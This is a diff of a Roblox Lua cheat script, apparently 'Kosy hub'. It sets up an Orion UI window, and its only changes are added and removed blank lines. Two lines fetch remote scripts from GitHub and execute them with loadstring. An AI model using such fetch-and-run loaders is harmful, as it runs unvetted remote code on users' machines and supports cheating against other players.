@@ -1,5 +1,10 @@
 getgenv().gui = false
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/trdrock/mm2/main/Hub"))()
+
+
+
+
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Kosy hub [3.5]-Summer Update„", HidePremium = false, IntroText = "Kosy hub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
 OrionLib:MakeNotification({
@@ -8,8 +13,6 @@ OrionLib:MakeNotification({
 	Image = "rbxassetid://18170549235",
 	Time = 2
 })
-
-
 --[[
 Name = <string> - The name of the UI.
 HidePremium = <bool> - Whether or not the user details shows Premium status or not.
